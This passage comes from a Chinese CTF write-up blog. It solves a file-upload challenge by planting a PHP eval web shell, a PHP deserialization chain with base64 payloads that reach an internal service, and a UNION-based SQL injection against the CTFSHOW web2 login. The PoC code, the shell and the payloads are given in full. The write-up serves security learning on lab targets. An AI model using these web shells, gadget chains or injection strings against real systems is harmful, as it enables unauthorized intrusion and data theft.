class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这里就是对宽高做了限制，然后不允许php出现所以我们之前用&lt;?&#x3D;代替还是没错的，主要就是定义宽高<br>原来直接在文件里面定义就好了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#define height 1</span></span><br><span class="line"><span class="comment">#define width 1</span></span><br><span class="line">&lt;<span class="string">?=</span> <span class="variable">@eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>
<p>成功上传！<br><img src="https://pic1.imgdb.cn/item/67b343ccd0e0a243d4004f14.png"><br><code>Cookie: PHPSESSID=nrd70psbefs9ma416hm6g3qfnc</code>所以我们的路径就在upload&#x2F;nrd70psbefs9ma416hm6g3qfnc&#x2F;2.php<br>蚁剑连接进来发现看不了根目录<br><img src="https://pic1.imgdb.cn/item/67b344dbd0e0a243d4004f48.png"><br>解决方法就是去蚁剑的虚拟终端里面去看</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">(www-data:/var/www/html/upload/nrd70psbefs9ma416hm6g3qfnc) $ cd /</span><br><span class="line">(www-data:/) $ ls -al</span><br><span class="line">total 88</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Feb<span class="number"> 17 </span>13:50 .</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Feb<span class="number"> 17 </span>13:50 ..</span><br><span class="line">-rwxr-xr-x  <span class="number"> 1 </span>root root   <span class="number"> 0 </span>Feb<span class="number"> 17 </span>13:50 .dockerenv</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>bin</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep <span class="number"> 3 </span><span class="number"> 2022 </span>boot</span><br><span class="line">drwxr-xr-x  <span class="number"> 5 </span>root root <span class="number"> 340 </span>Feb<span class="number"> 17 </span>13:50 dev</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Feb<span class="number"> 17 </span>13:50 etc</span><br><span class="line">-rwxrwxrwx  <span class="number"> 1 </span>root root  <span class="number"> 45 </span>Feb<span class="number"> 17 </span>13:50 flag</span><br><span class="line">-rwxrwxrwx  <span class="number"> 1 </span>root root  <span class="number"> 69 </span>Sep<span class="number"> 19 </span><span class="number"> 2022 </span>flag.sh</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep <span class="number"> 3 </span><span class="number"> 2022 </span>home</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>lib</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>lib64</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>media</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>mnt</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>opt</span><br><span class="line">dr-xr-xr-x<span class="number"> 290 </span>root root   <span class="number"> 0 </span>Feb<span class="number"> 17 </span>13:50 proc</span><br><span class="line">drwx------  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>root</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>run</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>sbin</span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>srv</span><br><span class="line">dr-xr-xr-x <span class="number"> 13 </span>root root   <span class="number"> 0 </span>Feb<span class="number"> 17 </span>13:50 sys</span><br><span class="line">drwxrwxrwt  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Feb<span class="number"> 17 </span>14:17 tmp</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 12 </span><span class="number"> 2022 </span>usr</span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span>root root<span class="number"> 4096 </span>Sep<span class="number"> 13 </span><span class="number"> 2022 </span>var</span><br><span class="line">(www-data:/) $ cat flag</span><br><span class="line">NSSCTF&#123;a716da50-93a3-4f5e-8451-fff514e48cc1&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="Power"><a href="#Power" class="headerlink" title="Power!"></a>Power!</h1><p><img src="https://pic1.imgdb.cn/item/67b345cdd0e0a243d4004fb9.png"><br>查看源码里面中 有一句注释</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ?source= --&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>随便输入一个文件之后，就给出源码<code>?source=/etc/passwd</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$black_list</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$local</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;black_list.<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="variable">$this</span>-&gt;path);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file</span>).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$url</span> = <span class="variable">$path</span>;</span><br><span class="line">            <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;local = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$superhacker</span> = <span class="string">&quot;hacker.jpg&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">goodman</span>(<span class="params"><span class="variable">$i</span>,<span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$i</span>-&gt;<span class="variable">$j</span> = <span class="variable language_">$this</span>-&gt;superhacker;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">goodman</span>(<span class="variable">$this</span>-&gt;a,<span class="variable">$this</span>-&gt;b);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">c</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>];    <span class="comment">//flag in /flag.php</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$path</span>)&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http:|gopher:|glob:|php:/i&quot;</span>,<span class="variable">$path</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;cheems.jpg&quot;</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;vergil.jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;POWER!!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>我们看到最后有一个反序列化函数，所以这题是一个反序列化链的题目<br>先看刚才读取文件的逻辑在这句</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_string(<span class="variable">$path</span>)&amp;&amp;!preg_match(<span class="string">&quot;/http:|gopher:|glob:|php:/i&quot;</span>,<span class="variable">$path</span>))&#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.base64_encode(file_get_contents(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
<p>那就先读一下当前目录下的flag.php，然后查看源代码，发现在这个图片src中确实有base64加密过的信息 <code>?image_path=flag.php</code></p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;data:jpg;base64,PD9waHANCg0KJGEgPSAiZ29vZCBqb2IsYnV0IHRoZXJlIGlzIG5vIGZsYWcNCg0KaSBwdXQgbXkgZmxhZyBpbiBpbnRyYW5ldCgxMjcuMC4wLjE6NjU1MDApDQoNCm91dHNpZGVyIGhhdmUgbm8gcGVybWlzc2lvbnMgdG8gZ2V0IGl0DQoNCmlmIHlvdSB3YW50IGl0LHRoZW4geW91IGhhdmUgdG8gdGFrZSBpdA0KDQpidXQgeW91IGFscmVhZHkga25ldyB0aGUgcnVsZXMNCg0KdHJ5IGl0IjsNCg0KPz4=&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- ?source= --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">┌──(root㉿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="language-xml">└─# echo PD9waHANCg0KJGEgPSAiZ29vZCBqb2IsYnV0IHRoZXJlIGlzIG5vIGZsYWcNCg0KaSBwdXQgbXkgZmxhZyBpbiBpbnRyYW5ldCgxMjcuMC4wLjE6NjU1MDApDQoNCm91dHNpZGVyIGhhdmUgbm8gcGVybWlzc2lvbnMgdG8gZ2V0IGl0DQoNCmlmIHlvdSB3YW50IGl0LHRoZW4geW91IGhhdmUgdG8gdGFrZSBpdA0KDQpidXQgeW91IGFscmVhZHkga25ldyB0aGUgcnVsZXMNCg0KdHJ5IGl0IjsNCg0KPz4= | base64 -d</span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="variable">$a</span> = <span class="string">&quot;good job,but there is no flag</span></span></span><br><span class="line"><span class="string"><span class="language-php"></span></span></span><br><span class="line"><span class="string"><span class="language-php">i put my flag in intranet(127.0.0.1:65500)</span></span></span><br><span class="line"><span class="string"><span class="language-php"></span></span></span><br><span class="line"><span class="string"><span class="language-php">outsider have no permissions to get it</span></span></span><br><span class="line"><span class="string"><span class="language-php"></span></span></span><br><span class="line"><span class="string"><span class="language-php">if you want it,then you have to take it</span></span></span><br><span class="line"><span class="string"><span class="language-php"></span></span></span><br><span class="line"><span class="string"><span class="language-php">but you already knew the rules</span></span></span><br><span class="line"><span class="string"><span class="language-php"></span></span></span><br><span class="line"><span class="string"><span class="language-php">try it&quot;</span>;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml">                                                                                                                          </span></span><br></pre></td></tr></table></figure>
<p>这里告诉我们要读到flag就要在内网的65500端口访问才可以<br>那就继续从源码中找到反序列化链。<br>和之前碰到这种类型题目一致，不能直接输出flag就去找怎么才能执行命令，很快就可以找到是在FileViewer类中的<br><code>$file = $this-&gt;curl($this-&gt;local.$this-&gt;path);</code>这个命令就会去访问<code>$this-&gt;local</code>的<code>$this-&gt;path文件</code><br>这个在FileViewer类的<code>loadfile</code>函数中，然后找到同样这个类中的<code>_call($f,$a)</code>函数会执行loadfile函数，但是这个函数仅仅是在这个类里面，没有体现怎么执行<br>现在再去找能去执行这个函数的东西，看到<code>Backdoor</code>这个类，（这个名字就已经提示了）<br>这个类第一个函数<code>goodman</code>作用让第一个参数的第二个参数属性变成这个类中的<code>superhacker</code><br>第二个<code>__destruct()</code>魔法函数，先执行一下goodman函数，然后执行<code>$this-&gt;a-&gt;c()</code><br>那么关键就来了，我们就利用<code>$this-&gt;a-&gt;c()</code>去执行FileViewer中的<code>_call($f,$a)</code><br>那么完整的链是：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line">入口： Backdoor <span class="built_in">__destruct</span>()  </span><br><span class="line">调用 FileViewer <span class="built_in">_call</span>($f,$a) 跳到</span><br><span class="line">FileViewer loadfile</span><br></pre></td></tr></table></figure></div>
<p>在看如何去访问内网的127.0.0.1:65500&#x2F;flag<br>这里我们访问的路径是<code>$this-&gt;local</code>拼接上<code>$this-&gt;path</code>,过滤只针对<code>$this-&gt;path</code>，这里把<code>/flag</code>过滤了<br>那绕过很容易，只要把一部分放在<code>$this-&gt;local</code>就好了，也就是让<code>$this-&gt;local</code>为<code>127.0.0.1:65500/fl</code>这样<br>那对这个<code>$this-&gt;local</code>有限制的就是__wakeup()这个魔法函数，他会重置值<br>绕过也很容易，这个wakeup函数是在FileViewer类初始化的时候会执行的，我们只要用Backdoor类中的goodman方法就可以重新赋值，那其实也不用管了<br>那现在整理清思路，先写一个大致的poc</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$black_list</span> ;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$local</span> ;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$path</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;local&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$superhacker</span>;</span><br><span class="line">       </span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title class_">FileViewer</span>();</span><br><span class="line">    <span class="variable">$back</span> = <span class="keyword">new</span> <span class="title class_">Backdoor</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$back</span> -&gt; a = <span class="variable">$f</span>; <span class="comment"># 入口，去执行$a类中的函数</span></span><br><span class="line">    <span class="variable">$back</span> -&gt; b = <span class="string">&quot;local&quot;</span>; <span class="comment">#让goodman去修改loacl</span></span><br><span class="line">    <span class="variable">$back</span> -&gt; superhacker = <span class="string">&quot;127.0.0.1:65500/fl&quot;</span>; <span class="comment">//这是goodman中我们想修改成的值</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$back</span> -&gt; a -&gt; path = <span class="string">&quot;ag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>((<span class="title function_ invoke__">serialize</span>(<span class="variable">$back</span>))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Tzo4OiJCYWNrZG9vciI6Mzp7czoxOiJhIjtPOjEwOiJGaWxlVmlld2VyIjozOntzOjEwOiJibGFja19saXN0IjtOO3M6NToibG9jYWwiO047czo0OiJwYXRoIjtzOjY6ImFnLnBocCI7fXM6MToiYiI7czo1OiJsb2NhbCI7czoxMToic3VwZXJoYWNrZXIiO3M6MTg6IjEyNy4wLjAuMTo2NTUwMC9mbCI7fQ==</span><br></pre></td></tr></table></figure></div>
<p>然后传入这个参数之后,报错了<br><img src="https://pic1.imgdb.cn/item/67b3567cd0e0a243d4005280.png"><br>报错的信息是Backdoor没有loadfile这个方法，我们再去看这边反序列化的源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="code"><pre><span class="line">$FV = unserialize(base64_decode($path_info))<span class="comment">;</span></span><br><span class="line">            $FV-&gt;loadfile()<span class="comment">;</span></span><br></pre></td></tr></table></figure></div>
<p>最后执行loadfile的是<code>$FV</code>，但是我们代码里面定义的是<code>$f</code>在<code>$back</code>中，由于反序列化是从里面到外面的，所以最后FV是Backdoor这个类的，<br>而这个类没有loadfile()这个函数，所以解决方法也知道了，我们让<code>$back</code>是一个新的FileViewer类的一个任意属性(但是我只有local属性成功了，可能是因为local没什么别的限制)，然后去反序列化这个新的类</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$black_list</span> ;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$local</span> ;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$superhacker</span>;</span><br><span class="line">       </span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title class_">FileViewer</span>();</span><br><span class="line">    <span class="variable">$back</span> = <span class="keyword">new</span> <span class="title class_">Backdoor</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$back</span> -&gt; a = <span class="variable">$f</span>; <span class="comment"># 入口，去执行$a类中的函数</span></span><br><span class="line">    <span class="variable">$back</span> -&gt; b = <span class="string">&quot;local&quot;</span>; <span class="comment">#让goodman去修改loacl</span></span><br><span class="line">    <span class="variable">$back</span> -&gt; superhacker = <span class="string">&quot;127.0.0.1:65500/fl&quot;</span>; <span class="comment">//这是goodman中我们想修改成的值</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$back</span> -&gt; a -&gt; path = <span class="string">&quot;ag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$new_one</span> = <span class="keyword">new</span> <span class="title class_">FileViewer</span>();<span class="comment">#新建一个对象</span></span><br><span class="line">    <span class="variable">$new_one</span> -&gt; local = <span class="variable">$back</span>;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>((<span class="title function_ invoke__">serialize</span>(<span class="variable">$new_one</span>))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">TzoxMDoiRmlsZVZpZXdlciI6Mzp7czoxMDoiYmxhY2tfbGlzdCI7TjtzOjU6ImxvY2FsIjtPOjg6IkJhY2tkb29yIjozOntzOjE6ImEiO086MTA6IkZpbGVWaWV3ZXIiOjM6e3M6MTA6ImJsYWNrX2xpc3QiO047czo1OiJsb2NhbCI7TjtzOjQ6InBhdGgiO3M6NjoiYWcucGhwIjt9czoxOiJiIjtzOjU6ImxvY2FsIjtzOjExOiJzdXBlcmhhY2tlciI7czoxODoiMTI3LjAuMC4xOjY1NTAwL2ZsIjt9czo0OiJwYXRoIjtOO30=</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67b35a17d0e0a243d4005318.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> TlNTQ1RGezIwMGE5YzU2LThiM2MtNDdmMC04ZmNjLWFjYjc5MWQ1N2M4NH0= | <span class="built_in">base64</span> -d</span><br><span class="line">NSSCTF&#123;200a9c56-8b3c-47f0-8fcc-acb791d57c84&#125;   </span><br></pre></td></tr></table></figure></div>
<p>这题参考的大佬wp：<a href="https://blog.csdn.net/Jayjay___/article/details/136852734">NSS [SWPUCTF 2022 新生赛] Power!</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOW第一部分web题wp整理</title>
    <url>/posts/3905.html</url>
    <content><![CDATA[<p>CTFSHOW第一部分web题wp整理</p>
<span id="more"></span>

<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>用户名和密码都是注入点<br>第一步：查询有几个字段： 1’ or 1&#x3D;1 orde by 3# （4就没有列数了 判断之后3列）<br>第二步： 发现回显位置： 1’ union select 1,2,3 #  回显2 说明回显位置在2<br>第三步： 查看数据表名称： 1’ union select 1,database(),3 #  得到web2<br>第四步： 得到数据表 1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database(); #</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOHOTKEY"><figure class="iseeu highlight /autohotkey"><table><tr><td class="code"><pre><span class="line">**`group_concat(table_name)`**：`group_concat` 是一个 MySQL 内置的聚合函数，它将查询结果中的多个值连接成一个字符串。`table_name` 是 `information_schema.tables` 表中的列，存储了所有表的名字。</span><br><span class="line">**`table_schema`**：表示数据库的名称，即该表属于哪个数据库</span><br></pre></td></tr></table></figure></div>
<p>查到了有flag 和 user表<br>第五步： 查看列名 1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’flag’; #<br>（和上一步的区别就是用information_schema.后面的内容不一样） 发现只有flag这列<br>最后一步查询数据 1’ union selcet 1,group_concat(flag),3 from web2.flag; #  （用xx.xx 来访问数据库和表）<br> 或者1’ union select 1,(select flag from flag),3; #</p>
